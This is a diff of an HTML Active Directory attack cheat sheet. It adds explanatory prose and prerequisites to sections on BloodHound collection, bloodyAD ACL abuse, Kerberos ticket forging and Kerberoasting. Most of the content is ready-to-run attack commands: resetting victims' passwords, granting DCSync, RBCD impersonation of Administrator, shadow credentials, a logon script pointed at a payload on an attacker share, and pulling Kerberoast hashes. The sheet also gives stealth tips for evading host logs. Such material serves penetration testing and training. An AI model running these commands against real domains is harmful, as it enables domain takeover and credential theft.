@@ -132,6 +132,34 @@
             background: var(--green-soft) !important;
             box-shadow: none !important;
         }
+
+        /* ── "why it works" explanation prose ────────────────────────────── */
+        .why {
+            font-size: 0.88rem;
+            color: var(--text);
+            line-height: 1.7;
+            margin: 0.4rem 0 0.6rem;
+        }
+        .why strong { color: var(--green-bright); font-weight: 700; }
+        .req {
+            border: 1px solid rgba(94,126,148,0.35);
+            background: rgba(94,126,148,0.08);
+            border-radius: 6px;
+            padding: 0.5rem 0.9rem;
+            margin: 0.5rem 0 0.9rem;
+            font-size: 0.82rem;
+            color: var(--text);
+            line-height: 1.6;
+        }
+        .req::before {
+            content: "REQUIRES";
+            display: inline-block;
+            font-weight: 800;
+            font-size: 0.68rem;
+            letter-spacing: 1.2px;
+            color: var(--green-bright);
+            margin-right: 0.5rem;
+        }
     </style>
 </head>
 <body>
@@ -177,18 +205,24 @@
                 <div class="buttons"><span class="red"></span><span class="yellow"></span><span class="green"></span></div>
                 <p class="command" data-cmd="cat adcheatsheet.md | grep '^##'"></p>
                 <p class="output">
-                    <div class="toc-grid">
+                    <span class="toc-grid">
                         <a href="#s01"><span class="toc-num">01.</span>BloodHound Collection</a>
                         <a href="#s02"><span class="toc-num">02.</span>BloodHound — Common Errors</a>
                         <a href="#s03"><span class="toc-num">03.</span>bloodyAD.py — ACL Object Manipulation</a>
                         <a href="#s04"><span class="toc-num">04.</span>Kerberos Ticket Operations</a>
-                        <a href="#s05"><span class="toc-num">05.</span>Certipy — ADCS Attacks</a>
-                        <a href="#s06"><span class="toc-num">06.</span>secretsdump.py</a>
-                        <a href="#s07"><span class="toc-num">07.</span>Mimikatz</a>
-                        <a href="#s08"><span class="toc-num">08.</span>Rubeus.exe</a>
-                        <a href="#s09"><span class="toc-num">09.</span>ACL-Based Shell Access</a>
-                        <a href="#s10"><span class="toc-num">10.</span>AD Rights &amp; Privileges → Privesc</a>
-                    </div>
+                        <a href="#s05"><span class="toc-num">05.</span>Kerberoasting &amp; AS-REP Roasting</a>
+                        <a href="#s06"><span class="toc-num">06.</span>Certipy — ADCS Attacks</a>
+                        <a href="#s07"><span class="toc-num">07.</span>secretsdump.py</a>
+                        <a href="#s08"><span class="toc-num">08.</span>Mimikatz</a>
+                        <a href="#s09"><span class="toc-num">09.</span>Rubeus.exe</a>
+                        <a href="#s10"><span class="toc-num">10.</span>ACL-Based Shell Access</a>
+                        <a href="#s11"><span class="toc-num">11.</span>AD Rights &amp; Privileges → Privesc</a>
+                        <a href="#s12"><span class="toc-num">12.</span>nxc — Recon &amp; Enumeration</a>
+                        <a href="#s13"><span class="toc-num">13.</span>nxc — Password Spraying &amp; Attacks</a>
+                        <a href="#s14"><span class="toc-num">14.</span>nxc — Execution &amp; Cred Dumping</a>
+                        <a href="#s15"><span class="toc-num">15.</span>nxc — LDAP, WinRM, MSSQL &amp; Modules</a>
+                        <a href="#s16"><span class="toc-num">16.</span>SMB Share Access</a>
+                    </span>
                 </p>
             </div>
 
@@ -196,26 +230,37 @@
             <details id="s01" open>
                 <summary><span class="sum-num">01</span><span class="sum-title">BloodHound Collection (bloodhound.py)</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
+                    <p>BloodHound ingests the raw relationships of the domain (group membership, ACLs, sessions, trusts, delegation) and lets you query attack paths as a graph. <code>bloodhound.py</code> is the Python collector — it runs from Linux with just domain credentials and talks LDAP + SMB to the DC, so you never need to run anything on a Windows host.</p>
+                    <div class="req">Any valid domain account (password, NT hash, or Kerberos ticket) and network access to the DC on 389/LDAP + 445/SMB.</div>
+
+                    <h3>Standard collection</h3>
+                    <p class="why"><strong>Why <code>-c All</code>:</strong> pulls every collection method in one run (objects, ACLs, sessions, trusts). Good first pass; noisier because it queries session data on member hosts.</p>
                     <pre class="cb"><span class="cm"># Standard — collect everything</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
-  -ns &lt;DC_IP&gt; -c All
+  -ns &lt;DC_IP&gt; -c All</pre>
 
-<span class="cm"># Specific collection methods (faster / less noise)</span>
+                    <h3>Targeted collection methods</h3>
+                    <p class="why"><strong>Why narrow it:</strong> <code>DCOnly</code> reads everything from the DC's LDAP only — no touching member workstations — so it is fast and quiet and still gives you ACLs, group membership and trusts (just not live sessions). Use it when you want paths without lighting up host logs.</p>
+                    <pre class="cb"><span class="cm"># Specific collection methods (faster / less noise)</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
   -ns &lt;DC_IP&gt; -c DCOnly              # DC objects only — fast, low noise
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
-  -ns &lt;DC_IP&gt; -c Session,Trusts      # sessions + trust relationships
+  -ns &lt;DC_IP&gt; -c Session,Trusts      # sessions + trust relationships</pre>
 
-<span class="cm"># NTLM hash instead of password</span>
+                    <h3>Authenticating without a password</h3>
+                    <p class="why"><strong>Why these exist:</strong> once you own a hash or a ticket you rarely have the plaintext. <code>--hashes</code> authenticates with the NT hash (pass-the-hash over LDAP); the Kerberos path uses a cached TGT so <strong>no secret touches the wire</strong> at all — the quietest option.</p>
+                    <pre class="cb"><span class="cm"># NTLM hash instead of password</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username \
   --hashes :NTLMHASH -ns &lt;DC_IP&gt; -c All
 
 <span class="cm"># Kerberos ticket (CCACHE) — no password on the wire</span>
 export KRB5CCNAME=/path/to/ticket.ccache
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -k --no-pass \
-  -ns &lt;DC_IP&gt; -c All
+  -ns &lt;DC_IP&gt; -c All</pre>
 
-<span class="cm"># Specify DC hostname explicitly</span>
+                    <h3>DC hostname + output</h3>
+                    <p class="why"><strong>Why <code>--dc</code>:</strong> when reverse DNS is broken the collector can't resolve the DC from the IP alone — naming it explicitly avoids that. <code>--zip</code> bundles the JSON ready for the GUI import.</p>
+                    <pre class="cb"><span class="cm"># Specify DC hostname explicitly</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
   --dc DC01.DOMAIN.LOCAL -ns &lt;DC_IP&gt; -c All
 
@@ -230,40 +275,46 @@ python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
             <details id="s02">
                 <summary><span class="sum-num">02</span><span class="sum-title">BloodHound — Common Errors &amp; Fixes</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <pre class="cb"><span class="cm"># ── Error: DNS resolution failure ────────────────────────────────────────────</span>
-<span class="cm"># Symptom: &quot;Could not find domain controller&quot;, &quot;NXDOMAIN&quot;, &quot;Name or service not known&quot;</span>
+                    <p>Nearly every collection failure is DNS, clock skew, or the wrong auth protocol. AD is DNS-driven and Kerberos is time-sensitive, so the collector has to resolve names through the DC and stay within five minutes of its clock.</p>
+
+                    <h3>DNS resolution failure</h3>
+                    <p class="why"><strong>Why it happens:</strong> your resolver doesn't know the AD zone. The collector must resolve the domain and DC names, which only the DC's DNS server answers — so point name resolution at the DC.</p>
+                    <pre class="cb"><span class="cm"># Symptom: &quot;Could not find domain controller&quot;, &quot;NXDOMAIN&quot;, &quot;Name or service not known&quot;</span>
 <span class="cm"># Fix: always pass -ns pointing at the DC</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
   -ns &lt;DC_IP&gt; -c All
 
 <span class="cm"># Or add the DC to /etc/resolv.conf temporarily</span>
-echo &quot;nameserver &lt;DC_IP&gt;&quot; | sudo tee -a /etc/resolv.conf
+echo &quot;nameserver &lt;DC_IP&gt;&quot; | sudo tee -a /etc/resolv.conf</pre>
 
-<span class="cm"># ── Error: Clock skew / KRB_AP_ERR_SKEW ──────────────────────────────────────</span>
-<span class="cm"># Symptom: Kerberos auth fails with clock skew error</span>
+                    <h3>Clock skew (KRB_AP_ERR_SKEW)</h3>
+                    <p class="why"><strong>Why it happens:</strong> Kerberos timestamps authenticators to stop replay. If your clock drifts more than ~5 minutes from the DC, every ticket is rejected. Sync to the DC and the error clears.</p>
+                    <pre class="cb"><span class="cm"># Symptom: Kerberos auth fails with clock skew error</span>
 sudo ntpdate &lt;DC_IP&gt;           # sync clock to DC
 sudo timedatectl set-ntp false
-sudo date -s &quot;$(net time -S &lt;DC_IP&gt;)&quot;   # or use net time
+sudo date -s &quot;$(net time -S &lt;DC_IP&gt;)&quot;   # or use net time</pre>
 
-<span class="cm"># ── Error: LDAP query failed / connection reset ───────────────────────────────</span>
-<span class="cm"># Symptom: collection hangs or returns 0 objects</span>
+                    <h3>LDAP query failures / hangs</h3>
+                    <p class="why"><strong>Why these flags help:</strong> default auth may try Kerberos and stall — <code>--auth-method ntlm</code> forces the simpler bind. <code>--dns-tcp</code> is for environments that block UDP/53 (DNS over TCP still works).</p>
+                    <pre class="cb"><span class="cm"># Symptom: collection hangs or returns 0 objects</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
   -ns &lt;DC_IP&gt; -c All --auth-method ntlm    # force NTLM (default may try Kerberos)
 
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
-  -ns &lt;DC_IP&gt; -c All --dns-tcp             # use TCP for DNS (firewalled UDP)
+  -ns &lt;DC_IP&gt; -c All --dns-tcp             # use TCP for DNS (firewalled UDP)</pre>
 
-<span class="cm"># ── Error: &quot;Connection refused&quot; on port 389 ───────────────────────────────────</span>
-<span class="cm"># LDAP may be blocked — try LDAPS (636)</span>
+                    <h3>Port 389 refused → try LDAPS</h3>
+                    <p class="why"><strong>Why:</strong> some DCs require signing/channel-binding and only accept TLS. 636/LDAPS satisfies that where plaintext 389 is refused.</p>
+                    <pre class="cb"><span class="cm"># LDAP may be blocked — try LDAPS (636)</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
-  -ns &lt;DC_IP&gt; -c All -p 636 --secure       # TLS / LDAPS
+  -ns &lt;DC_IP&gt; -c All -p 636 --secure       # TLS / LDAPS</pre>
 
-<span class="cm"># ── Error: STATUS_LOGON_FAILURE / bad credentials ────────────────────────────</span>
-<span class="cm"># Verify creds first:</span>
+                    <h3>Bad credentials / empty output</h3>
+                    <p class="why"><strong>Why verify first:</strong> confirm the creds with a cheap SMB check before anything else, and watch the lockout policy — a looping collector can lock the account. <code>--disable-pooling -w 1</code> forces single-threaded collection when concurrency corrupts results.</p>
+                    <pre class="cb"><span class="cm"># Verify creds first:</span>
 crackmapexec smb &lt;DC_IP&gt; -u username -p &#x27;Password123&#x27;
 <span class="cm"># Check for account lockout policy before brute-forcing</span>
 
-<span class="cm"># ── Error: empty or partial JSON output ──────────────────────────────────────</span>
 <span class="cm"># Symptom: files created but few/no objects collected</span>
 python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
   -ns &lt;DC_IP&gt; -c All --disable-pooling -w 1   # single-threaded, no pool</pre>
@@ -274,67 +325,87 @@ python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
             <details id="s03">
                 <summary><span class="sum-num">03</span><span class="sum-title">bloodyAD.py — ACL Object Manipulation</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
+                    <p><code>bloodyAD</code> turns an ACL edge BloodHound found (GenericWrite, GenericAll, WriteDACL…) into an actual change on the object. Each command below is the concrete abuse of one specific right — the right you hold decides which command you can run.</p>
                     <p>All commands assume <code>-d DOMAIN.LOCAL -u USER -p 'PASS' --host DC_IP</code>. Swap <code>-p 'PASS'</code> for <code>--hashes :NTLMHASH</code> or <code>-k</code> (Kerberos with <code>KRB5CCNAME</code> set).</p>
-                    <pre class="cb"><span class="cm"># ─────────────────────────────────────────────────────────────────────────────</span>
-<span class="cm"># SYNTAX:  python3 bloodyAD.py -d DOMAIN.LOCAL -u USER -p &#x27;PASS&#x27; --host DC_IP</span>
-<span class="cm"># Also accepts: --hashes LMHASH:NTLMHASH   or   -k (Kerberos w/ KRB5CCNAME)</span>
-<span class="cm"># ─────────────────────────────────────────────────────────────────────────────</span>
+                    <pre class="cb"><span class="cm"># SYNTAX:  python3 bloodyAD.py -d DOMAIN.LOCAL -u USER -p &#x27;PASS&#x27; --host DC_IP</span>
+<span class="cm"># Also accepts: --hashes LMHASH:NTLMHASH   or   -k (Kerberos w/ KRB5CCNAME)</span></pre>
 
-<span class="cm"># ── GET — read object attributes ──────────────────────────────────────────────</span>
-python3 bloodyAD.py [...] get object TARGET_USER \
+                    <h3>Read attributes (get)</h3>
+                    <p class="why"><strong>Why first:</strong> confirm what an object actually has before abusing it — current SPNs, group membership, and the RBCD attribute tell you which path is open.</p>
+                    <pre class="cb">python3 bloodyAD.py [...] get object TARGET_USER \
   --attr memberOf,servicePrincipalName,msDS-AllowedToActOnBehalfOfOtherIdentity
 
-python3 bloodyAD.py [...] get object &quot;Domain Admins&quot; --attr member
+python3 bloodyAD.py [...] get object &quot;Domain Admins&quot; --attr member</pre>
 
-<span class="cm"># ── SET PASSWORD (GenericAll / ForceChangePassword) ───────────────────────────</span>
-python3 bloodyAD.py [...] set password TARGET_USER &#x27;NewPassword123!&#x27;
+                    <h3>Reset a password</h3>
+                    <p class="why"><strong>Why it works:</strong> <code>GenericAll</code> or the <code>ForceChangePassword</code> extended right lets you set a new password <strong>without knowing the old one</strong>. Instant account takeover — but it's destructive (the real user/service breaks), so prefer SPN or shadow-cred abuse when stealth matters.</p>
+                    <div class="req"><code>GenericAll</code> or <code>ForceChangePassword</code> (User-Force-Change-Password) on the target.</div>
+                    <pre class="cb">python3 bloodyAD.py [...] set password TARGET_USER &#x27;NewPassword123!&#x27;</pre>
 
-<span class="cm"># ── SET SPN — targeted Kerberoasting (GenericWrite / GenericAll on user) ──────</span>
-python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName \
+                    <h3>Targeted Kerberoasting (set SPN)</h3>
+                    <p class="why"><strong>Why it works:</strong> writing a <code>servicePrincipalName</code> onto a user makes that account Kerberoastable on demand — you then request its TGS and crack it offline (see §05). Remove the SPN afterwards to clean up.</p>
+                    <div class="req"><code>GenericWrite</code> or <code>GenericAll</code> on the target user.</div>
+                    <pre class="cb">python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName \
   -v &#x27;MSSQLSvc/fake.domain.local:1433&#x27;
 
 <span class="cm"># Remove the SPN after attack (cleanup)</span>
-python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v &#x27;&#x27;
+python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v &#x27;&#x27;</pre>
 
-<span class="cm"># ── SHADOW CREDENTIALS — add KeyCredential (GenericWrite / GenericAll) ────────</span>
-python3 bloodyAD.py [...] set shadowCredentials TARGET_USER
-<span class="cm"># Then authenticate:  certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP</span>
+                    <h3>Shadow Credentials</h3>
+                    <p class="why"><strong>Why it works:</strong> you append a certificate (KeyCredentialLink) to the target's <code>msDS-KeyCredentialLink</code>, then authenticate with PKINIT as that user. Non-destructive — unlike a password reset the account keeps working, so it's the stealthier takeover.</p>
+                    <div class="req"><code>GenericWrite</code>/<code>GenericAll</code> on the target <em>and</em> a DC with PKINIT (ADCS or the KDC cert) available.</div>
+                    <pre class="cb">python3 bloodyAD.py [...] set shadowCredentials TARGET_USER
+<span class="cm"># Then authenticate:  certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP</span></pre>
 
-<span class="cm"># ── ADD / REMOVE GROUP MEMBER (GenericAll / Self / AddMember on group) ────────</span>
-python3 bloodyAD.py [...] add groupMember &quot;Domain Admins&quot; TARGET_USER
-python3 bloodyAD.py [...] remove groupMember &quot;Domain Admins&quot; TARGET_USER
+                    <h3>Add / remove group members</h3>
+                    <p class="why"><strong>Why it works:</strong> write access to a group's <code>member</code> attribute lets you add any principal — add yourself to a privileged group and inherit its rights immediately.</p>
+                    <div class="req"><code>GenericAll</code>, <code>WriteProperty</code>/<code>Self</code>, or <code>AddMember</code> on the group.</div>
+                    <pre class="cb">python3 bloodyAD.py [...] add groupMember &quot;Domain Admins&quot; TARGET_USER
+python3 bloodyAD.py [...] remove groupMember &quot;Domain Admins&quot; TARGET_USER</pre>
 
-<span class="cm"># ── GRANT DCSync (WriteDACL on domain) ────────────────────────────────────────</span>
-python3 bloodyAD.py [...] add dcsync TARGET_USER
+                    <h3>Grant DCSync</h3>
+                    <p class="why"><strong>Why it works:</strong> writing the domain DACL lets you give an account the replication rights (<code>DS-Replication-Get-Changes</code> + <code>-All</code>) that DCSync needs. That account can then pull every hash in the domain — full compromise — and it's a quiet backdoor because it looks like a normal replication partner.</p>
+                    <div class="req"><code>WriteDACL</code> on the domain object (<code>DC=DOMAIN,DC=LOCAL</code>).</div>
+                    <pre class="cb">python3 bloodyAD.py [...] add dcsync TARGET_USER</pre>
 
-<span class="cm"># ── RBCD — Resource-Based Constrained Delegation (GenericWrite on computer) ───</span>
-<span class="cm"># Grant ATTACKER_MACHINE$ the right to impersonate users on TARGET_MACHINE$</span>
+                    <h3>RBCD — Resource-Based Constrained Delegation</h3>
+                    <p class="why"><strong>Why it works:</strong> writing <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on a computer tells it to trust a machine account you control to act "on behalf of" any user. You then run S4U2Self+S4U2Proxy (§04) to mint a service ticket as Administrator to that host. This is the standard pivot from <code>GenericWrite on a computer</code> to a shell on it.</p>
+                    <div class="req"><code>GenericWrite</code>/<code>GenericAll</code> on the target computer, plus a machine account you control (MachineAccountQuota &gt; 0 lets you make one).</div>
+                    <pre class="cb"><span class="cm"># Grant ATTACKER_MACHINE$ the right to impersonate users on TARGET_MACHINE$</span>
 python3 bloodyAD.py [...] set rbcd TARGET_MACHINE$ ATTACKER_MACHINE$
 
 <span class="cm"># Clear RBCD after attack</span>
-python3 bloodyAD.py [...] remove rbcd TARGET_MACHINE$ ATTACKER_MACHINE$
+python3 bloodyAD.py [...] remove rbcd TARGET_MACHINE$ ATTACKER_MACHINE$</pre>
 
-<span class="cm"># ── UAC FLAGS (GenericAll) ─────────────────────────────────────────────────────</span>
-python3 bloodyAD.py [...] set uac TARGET_USER -f ACCOUNTDISABLE      # disable
-python3 bloodyAD.py [...] set uac TARGET_USER -f DONT_REQ_PREAUTH    # ASREPRoastable
+                    <h3>UAC flags</h3>
+                    <p class="why"><strong>Why it works:</strong> the <code>userAccountControl</code> bitmask controls account behaviour. Flipping <code>DONT_REQ_PREAUTH</code> makes the account AS-REP roastable (§05) even though it wasn't before — a deliberate weakening you can undo afterwards.</p>
+                    <div class="req"><code>GenericAll</code> (or write to <code>userAccountControl</code>) on the target.</div>
+                    <pre class="cb">python3 bloodyAD.py [...] set uac TARGET_USER -f ACCOUNTDISABLE      # disable
+python3 bloodyAD.py [...] set uac TARGET_USER -f DONT_REQ_PREAUTH    # ASREPRoastable</pre>
 
-<span class="cm"># ── LOGON SCRIPT (GenericWrite — code exec on next logon) ─────────────────────</span>
-python3 bloodyAD.py [...] set object TARGET_USER scriptPath \
-  -v &#x27;\\ATTACKER_IP\share\payload.bat&#x27;
+                    <h3>Logon script (code exec)</h3>
+                    <p class="why"><strong>Why it works:</strong> <code>scriptPath</code> runs at the user's next interactive logon. Point it at a payload on a share you control and you get execution in that user's context — but you have to wait for them to log in.</p>
+                    <div class="req"><code>GenericWrite</code> on the target user.</div>
+                    <pre class="cb">python3 bloodyAD.py [...] set object TARGET_USER scriptPath \
+  -v &#x27;\\ATTACKER_IP\share\payload.bat&#x27;</pre>
 
-<span class="cm"># ── RESTORE DELETED OBJECT ────────────────────────────────────────────────────</span>
-<span class="cm"># First find deleted objects (requires Recycle Bin feature enabled)</span>
+                    <h3>Restore a deleted object</h3>
+                    <p class="why"><strong>Why you'd want it:</strong> recover an object you (or a defender) removed, or resurrect a stale privileged account. Needs the AD Recycle Bin feature enabled.</p>
+                    <pre class="cb"><span class="cm"># First find deleted objects (requires Recycle Bin feature enabled)</span>
 python3 bloodyAD.py [...] get object \
   &quot;CN=DeletedUser,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL&quot; --attr *
 
 python3 bloodyAD.py [...] restore object \
-  &quot;CN=DeletedUser\0ADEL:guid,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL&quot;
+  &quot;CN=DeletedUser\0ADEL:guid,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL&quot;</pre>
 
-<span class="cm"># ── COMPUTER OBJECT — create machine account (MachineAccountQuota &gt; 0) ────────</span>
-python3 bloodyAD.py [...] add computer ATTACKER_MACHINE$ &#x27;MachinePass123!&#x27;
+                    <h3>Create a machine account</h3>
+                    <p class="why"><strong>Why it works:</strong> by default any authenticated user can join up to 10 computers (<code>ms-DS-MachineAccountQuota = 10</code>). A machine account you own is the controllable principal RBCD and S4U need.</p>
+                    <div class="req"><code>ms-DS-MachineAccountQuota &gt; 0</code> (default 10).</div>
+                    <pre class="cb">python3 bloodyAD.py [...] add computer ATTACKER_MACHINE$ &#x27;MachinePass123!&#x27;</pre>
 
-<span class="cm"># ── GENERIC ATTRIBUTE WRITE ───────────────────────────────────────────────────</span>
-python3 bloodyAD.py [...] set object TARGET_USER altSecurityIdentities \
+                    <h3>Generic attribute write</h3>
+                    <p class="why"><strong>Why it matters:</strong> many edges reduce to "write one attribute." Writing <code>altSecurityIdentities</code>, for example, maps a certificate you hold to the victim for explicit cert mapping — another certificate-based takeover.</p>
+                    <pre class="cb">python3 bloodyAD.py [...] set object TARGET_USER altSecurityIdentities \
   -v &#x27;Kerberos:cn=attacker,cn=users,dc=domain,dc=local&#x27;</pre>
                 </div>
             </details>
@@ -343,8 +414,11 @@ python3 bloodyAD.py [...] set object TARGET_USER altSecurityIdentities \
             <details id="s04">
                 <summary><span class="sum-num">04</span><span class="sum-title">Kerberos Ticket Operations</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <pre class="cb"><span class="cm"># ── getTGT.py ─────────────────────────────────────────────────────────────────</span>
-<span class="cm"># Password</span>
+                    <p>In Kerberos you prove identity once to get a <strong>TGT</strong>, then exchange it for per-service <strong>TGS</strong> tickets. These Impacket tools let you obtain, convert and reuse those tickets from Linux — the backbone of pass-the-ticket and delegation abuse.</p>
+
+                    <h3>getTGT.py — obtain a TGT</h3>
+                    <p class="why"><strong>Why three input types:</strong> a TGT is granted to anyone who can prove the account's secret. A password, its NT hash (pass-the-hash), or its AES key (pass-the-key) all work — AES is the best OPSEC because modern domains use AES by default and an RC4 request stands out.</p>
+                    <pre class="cb"><span class="cm"># Password</span>
 python3 getTGT.py DOMAIN.LOCAL/username:&#x27;Password123&#x27; -dc-ip DC_IP
 
 <span class="cm"># NTLM hash (Pass-the-Hash → TGT)</span>
@@ -355,10 +429,12 @@ python3 getTGT.py DOMAIN.LOCAL/username -aesKey AES256KEY -dc-ip DC_IP
 
 <span class="cm"># Output file name</span>
 python3 getTGT.py DOMAIN.LOCAL/username:&#x27;Password123&#x27; -dc-ip DC_IP \
-  -o custom_name.ccache
+  -o custom_name.ccache</pre>
 
-<span class="cm"># ── getST.py — Service Ticket (TGS) ──────────────────────────────────────────</span>
-<span class="cm"># Request a TGS for a specific SPN</span>
+                    <h3>getST.py — request a service ticket (incl. S4U)</h3>
+                    <p class="why"><strong>Why <code>-impersonate</code>:</strong> this is the S4U2Self + S4U2Proxy chain. If your account (usually a machine account) is trusted for delegation to a service, the KDC will hand you a ticket <em>as any user you name</em> for that service — so you request a <code>cifs/</code> ticket as Administrator and own the target. This is how an RBCD or constrained-delegation edge becomes a shell.</p>
+                    <div class="req">For plain TGS: any valid creds. For <code>-impersonate</code>: the requesting account must be trusted to delegate to the target SPN (RBCD you set, or classic constrained delegation).</div>
+                    <pre class="cb"><span class="cm"># Request a TGS for a specific SPN</span>
 python3 getST.py DOMAIN.LOCAL/username:&#x27;Password123&#x27; \
   -spn MSSQLSvc/server.domain.local -dc-ip DC_IP
 
@@ -368,10 +444,11 @@ python3 getST.py DOMAIN.LOCAL/machine$:&#x27;MachinePass123!&#x27; \
 
 <span class="cm"># With hash</span>
 python3 getST.py DOMAIN.LOCAL/machine$ -hashes :MACHINEPASSHASH \
-  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
+  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP</pre>
 
-<span class="cm"># ── KRB5CCNAME — exporting and using tickets ──────────────────────────────────</span>
-<span class="cm"># Export ticket for all impacket / bloodyAD tools</span>
+                    <h3>Using tickets (KRB5CCNAME)</h3>
+                    <p class="why"><strong>Why it works:</strong> Impacket reads the ticket path from the <code>KRB5CCNAME</code> environment variable. Export it once and every tool with <code>-k -no-pass</code> authenticates with that ticket — no secret on the wire, and it survives a password reset.</p>
+                    <pre class="cb"><span class="cm"># Export ticket for all impacket / bloodyAD tools</span>
 export KRB5CCNAME=/path/to/username.ccache
 
 <span class="cm"># Use with impacket</span>
@@ -388,91 +465,182 @@ crackmapexec smb TARGET_IP --kerberos -u Administrator -d DOMAIN.LOCAL
 klist
 
 <span class="cm"># Destroy all tickets</span>
-kdestroy
+kdestroy</pre>
 
-<span class="cm"># ── ticketConverter.py — CCACHE ↔ Kirbi ──────────────────────────────────────</span>
-python3 ticketConverter.py ticket.ccache ticket.kirbi   # → Kirbi for Rubeus
+                    <h3>ticketConverter.py — CCACHE ↔ Kirbi</h3>
+                    <p class="why"><strong>Why convert:</strong> Linux/Impacket uses <code>.ccache</code>; Windows/Rubeus/Mimikatz use <code>.kirbi</code>. Convert when you move a ticket between a Linux foothold and a Windows host.</p>
+                    <pre class="cb">python3 ticketConverter.py ticket.ccache ticket.kirbi   # → Kirbi for Rubeus
 python3 ticketConverter.py ticket.kirbi  ticket.ccache  # → CCACHE for Linux</pre>
                     <div class="tip">After exporting <code>KRB5CCNAME</code>, every Impacket tool with <code>-k -no-pass</code> will use the ticket automatically. No password goes on the wire.</div>
                 </div>
             </details>
 
-            <!-- 05 Certipy -->
+            <!-- 05 Kerberoasting (NEW) -->
             <details id="s05">
-                <summary><span class="sum-num">05</span><span class="sum-title">Certipy — ADCS Attacks</span><span class="sum-arrow">▶</span></summary>
+                <summary><span class="sum-num">05</span><span class="sum-title">Kerberoasting &amp; AS-REP Roasting</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <p>Always start with <code>certipy find -vulnerable</code> to identify the ESC class before running the matching exploit chain.</p>
-                    <pre class="cb"><span class="cm"># ── Enumerate ADCS — find CA and templates ────────────────────────────────────</span>
-certipy find -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; -dc-ip DC_IP
+                    <p>Two offline-cracking attacks that need little or no privilege. Both exploit the fact that Kerberos hands out material encrypted with an account's long-term key, which you can crack at your leisure off the wire.</p>
+
+                    <h3>How Kerberoasting works</h3>
+                    <p class="why"><strong>Why it works:</strong> any authenticated user is allowed to request a <strong>TGS</strong> for any account that has a <code>servicePrincipalName</code>. The TGS is partly encrypted with the <strong>service account's own key</strong> (its NT hash for RC4/etype 23, or its AES key). You take that encrypted blob offline and brute-force it — a hit reveals the service account's plaintext password. It lands so often because service accounts tend to have old, human-chosen, non-expiring passwords, and because you can force the cheap-to-crack RC4 variant.</p>
+                    <div class="req">Any valid domain account. Targets must have an SPN set (service accounts, or any user you gave one to via §03).</div>
+
+                    <h3>GetUserSPNs.py (Impacket — from Linux)</h3>
+                    <p class="why"><strong>Why list first:</strong> running without <code>-request</code> just enumerates which accounts are roastable, so you pick high-value, crackable targets instead of blindly roasting everything (some orgs plant honeypot SPNs). Add <code>-request</code> to pull the hashes; <code>-request-user</code> targets one account.</p>
+                    <pre class="cb"><span class="cm"># List kerberoastable accounts (no hashes pulled — recon only)</span>
+python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:&#x27;Password123&#x27;
+
+<span class="cm"># Request TGS hashes for ALL SPN accounts, save in hashcat format</span>
+python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:&#x27;Password123&#x27; \
+  -request -outputfile kerberoast.txt
+
+<span class="cm"># Target a single account (quieter — one TGS request)</span>
+python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:&#x27;Password123&#x27; \
+  -request-user svc_sql -outputfile svc_sql.txt
+
+<span class="cm"># With NT hash or a Kerberos ticket instead of a password</span>
+python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username -hashes :NTLMHASH -request
+export KRB5CCNAME=user.ccache
+python3 GetUserSPNs.py -dc-ip DC_IP -k -no-pass DOMAIN.LOCAL/username -request
+
+<span class="cm"># Kerberoast across a trusted domain (needs creds in the current domain)</span>
+python3 GetUserSPNs.py -target-domain CHILD.DOMAIN.LOCAL \
+  -dc-ip DC_IP DOMAIN.LOCAL/username:&#x27;Password123&#x27; -request</pre>
+
+                    <h3>nxc — one-shot roast over LDAP</h3>
+                    <p class="why"><strong>Why use it:</strong> NetExec does the enumerate-and-request in a single command and writes the hashes straight to a file. Handy when you just want the hashes and already have nxc in hand.</p>
+                    <pre class="cb">nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --kerberoasting kerberoast.txt
+nxc ldap DC_IP -u username -H NTLMHASH --kerberoasting kerberoast.txt</pre>
+
+                    <h3>Targeted Kerberoasting (no SPN? make one)</h3>
+                    <p class="why"><strong>Why it works:</strong> if you hold <code>GenericWrite</code>/<code>GenericAll</code> over a user that has <em>no</em> SPN, you can write one, roast it, then delete it. Turns an ACL edge into a crackable hash for that specific (often privileged) account.</p>
+                    <div class="req"><code>GenericWrite</code>/<code>GenericAll</code> on the target user (see §03 for the bloodyAD/PowerView set-SPN commands).</div>
